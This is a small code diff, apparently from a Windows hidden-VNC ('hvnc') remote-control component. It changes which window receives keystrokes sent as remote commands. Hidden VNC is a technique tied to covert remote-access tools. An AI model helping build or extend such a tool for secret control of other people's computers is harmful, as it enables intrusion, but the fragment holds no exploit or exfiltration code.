@@ -421,7 +421,8 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = GetFocusedWindow();
+            HWND hTarget = g_hCurrentFocus;
+            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
             if (action == "hvnc_keydown") {
